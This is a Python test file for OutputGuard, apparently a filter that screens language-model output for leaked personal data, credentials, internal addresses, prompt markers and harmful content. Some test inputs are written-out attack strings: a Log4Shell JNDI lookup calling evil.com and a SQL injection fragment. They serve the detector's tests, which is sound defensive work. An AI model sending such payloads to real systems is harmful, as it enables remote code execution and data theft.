"""PicoWatch OutputGuard tests."""

from pathlib import Path

from picowatch.config import PicoWatchConfig
from picowatch.output_guard import OutputGuard

RULES_DIR = Path(__file__).parent.parent / "rules"
OUTPUT_RULES_DIR = RULES_DIR / "output_policy"


class TestOutputGuard:
    """Test L6 OutputGuard."""

    def test_clean_output_passes(self) -> None:
        """Clean output with no violations passes."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("The weather is sunny today.")
        assert result.valid is True
        assert result.score < 0.4

    def test_pii_ssn_detected(self) -> None:
        """SSN in output is detected and redacted."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("Your SSN is 123-45-6789")
        assert "out_pii_ssn" in result.violations
        assert result.redacted is not None
        assert "[SSN-REDACTED]" in result.redacted

    def test_pii_email_detected(self) -> None:
        """Email in output is detected and redacted."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("Contact admin@example.com for help")
        assert "out_pii_email" in result.violations
        assert "[EMAIL-REDACTED]" in (result.redacted or "")

    def test_api_key_detected(self) -> None:
        """AWS API key pattern is detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("The key is AKIAIOSFODNN7EXAMPLE")
        assert "out_pii_api_key" in result.violations

    def test_schema_validation_type_mismatch(self) -> None:
        """Schema type mismatch is detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate('"hello"', schema={"type": "object"})
        assert "out_fmt_type_mismatch" in result.violations

    def test_schema_validation_missing_required(self) -> None:
        """Missing required fields are detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate('{"name": "test"}', schema={"type": "object", "required": ["name", "email"]})
        assert "out_fmt_missing_required_email" in result.violations

    def test_internal_url_detected(self) -> None:
        """Internal/private URLs are detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("The server is at 192.168.1.100")
        assert "out_exfil_internal_url" in result.violations

    def test_deterministic(self) -> None:
        """Same input + same rules = same result."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        text = "Your SSN is 123-45-6789"
        result1 = guard.validate(text)
        result2 = guard.validate(text)
        assert result1.score == result2.score
        assert result1.violations == result2.violations
    def test_jwt_detected(self) -> None:
        """JWT token in output is detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("Token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNrg0xMlYnJ3xL5w")
        assert "out_pii_jwt" in result.violations

    def test_ssh_key_detected(self) -> None:
        """SSH private key in output is detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA")
        assert "out_exfil_ssh_key" in result.violations

    def test_database_url_detected(self) -> None:
        """Database connection string in output is detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("postgres://user:pass@db.example.com:5432/prod")
        assert "out_exfil_database_url" in result.violations

    def test_log4shell_detected(self) -> None:
        """Log4Shell JNDI string in output is detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("${jndi:ldap://evil.com/a}")
        assert "out_fmt_log4shell" in result.violations

    def test_sql_injection_detected(self) -> None:
        """SQL injection in output field is detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("name value: ' OR 1=1 --")
        assert "out_fmt_sql_injection" in result.violations

    def test_malware_instructions_detected(self) -> None:
        """Malware creation instructions in output are detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("how to create a ransomware")
        assert "out_harm_malware" in result.violations

    def test_aws_arn_detected(self) -> None:
        """AWS ARN in output is detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("arn:aws:s3:::my-bucket/key")
        assert "out_pii_aws_arn" in result.violations

    def test_prompt_marker_leak_detected(self) -> None:
        """LLM prompt markers leaked in output are detected."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("<|im_start|>system\nYou are helpful")
        assert "out_fmt_prompt_leak_marker" in result.violations

    def test_benign_ip_not_flagged_at_low_weight(self) -> None:
        """Public IP in benign context has low weight."""
        config = PicoWatchConfig(rules_dir=RULES_DIR)
        guard = OutputGuard(config=config)
        result = guard.validate("The server is at 8.8.8.8")
        # IP rule weight is 0.70, should trigger but may not block alone
        assert "out_pii_ip_address" in result.violations